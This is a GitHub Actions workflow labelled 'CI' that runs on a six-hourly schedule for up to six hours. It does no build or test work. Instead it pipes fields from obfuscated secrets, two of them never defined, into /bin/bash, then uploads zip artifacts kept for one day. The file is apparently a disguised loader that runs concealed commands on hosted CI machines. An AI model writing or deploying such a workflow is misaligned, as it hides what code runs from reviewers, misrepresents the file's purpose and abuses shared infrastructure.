name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '9 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  handler:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Launch
        env:
          gxj9385: ${{ secrets.gxj9385 }}
        run: |
          printf '%s' "$gxj9385" | jq -r .i2 | /bin/bash
          printf '%s' "$gnb2851" | jq -r .wfse6 | /bin/bash
          printf '%s' "$rp6" | jq -r .mzxih8 | /bin/bash

      - name: Persist output
        uses: actions/upload-artifact@v4
        with:
          name: Weqsk2MH
          path: "*.zip"
          retention-days: 1
